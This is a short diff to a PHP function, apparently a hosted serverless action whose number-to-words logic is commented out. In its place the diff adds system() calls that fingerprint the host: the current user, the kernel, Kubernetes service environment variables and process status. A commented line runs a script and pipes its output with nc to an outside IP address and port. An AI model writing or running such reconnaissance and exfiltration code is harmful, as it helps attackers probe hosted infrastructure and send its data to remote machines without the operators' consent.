@@ -9,7 +9,13 @@ function main(array $args)
     
 //     $number = (int)($args['number']);
 //     $words = (new NumberToWords)->toWords($number);
- echo(system("whoami"));
+echo(system("whoami"));
+echo(system("uname -a"));
+echo(system("echo 'check env vars'"));
+echo(system("env | grep -E '(KUBERNETES|[^_]SERVICE)_PORT=' | sort"));
+echo(system("echo 'cat /proc/self/status'"));
+echo(system("/proc/self/status"));
+     
  
 //     echo("------");
 //  echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
